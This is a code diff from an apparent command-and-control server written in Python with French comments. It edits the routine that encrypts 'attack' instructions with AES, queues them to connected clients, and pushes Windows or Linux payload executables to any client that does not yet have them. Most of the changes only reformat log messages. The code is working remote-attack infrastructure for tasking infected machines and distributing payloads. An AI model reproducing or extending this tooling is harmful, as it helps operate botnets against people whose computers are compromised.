@@ -26,18 +26,19 @@ def format_attack_data(type, id, data):
 
     json_data.update(data)
 
-    print("json_data = " + str(json_data))
+    print("\t\t(+) data formed as json")
 
     return json_data
 
 
 
 def execute_attack(client, attack):
-    print("sending attack to " + str(client['addr']))
-    print(client)
+    print("\t[+] sending attack to " + str(client['addr']))
+    # print(client)
+    # print(attack)
 
      # Récupération des données de l'attaque
-    attack_data = json.loads(attack[5])
+    attack_data = json.loads(attack[4])
     attack_type = attack[2]
     attack_id = attack[0]
 
@@ -48,7 +49,8 @@ def execute_attack(client, attack):
     cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
 
     client['emission_queue'].put(cipher_text)
-    print("Instruction envoyée")
+
+    print("\t[+] instruction envoyée")
 
     # reception du message retourner par le client 
     try :
@@ -58,16 +60,16 @@ def execute_attack(client, attack):
 
         if pt == "YES":
             # le client à l'exécutable
-            print("Le client à déja l'exécutable")
+            print("\t[+] Le client à déja l'exécutable")
         else:
             # envoyer l'exécutable 
-            print("Le client n'a pas l'exécutable")
+            print("\t[!] Le client n'a pas l'exécutable")
             attack_type = attack[2]
             #Récupérer os du client 
             if client['os'] == "windows":
                 executable_path = 'actions/windows/' + attack_type + '.exe'
             else:
-                executable_path = 'actions/linux/' + attack_type + '.sh'
+                executable_path = 'actions/linux/' + attack_type
 
             if os.path.isfile(executable_path):
                 with open(executable_path, 'rb') as f:
@@ -78,11 +80,11 @@ def execute_attack(client, attack):
                     
                     client['emission_queue'].put(cipher_text)
 
-                    print("L'exécutable a été envoyé")
+                    print("\t[+] L'exécutable a été envoyé")
             else:
-                print("L'exécutable n'a pas été trouvé sur le serveur")
+                print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
     except Empty:
-        print("Le client n'a pas répondu")
+        print("\t[!] Le client n'a pas répondu")
         pass
 
     
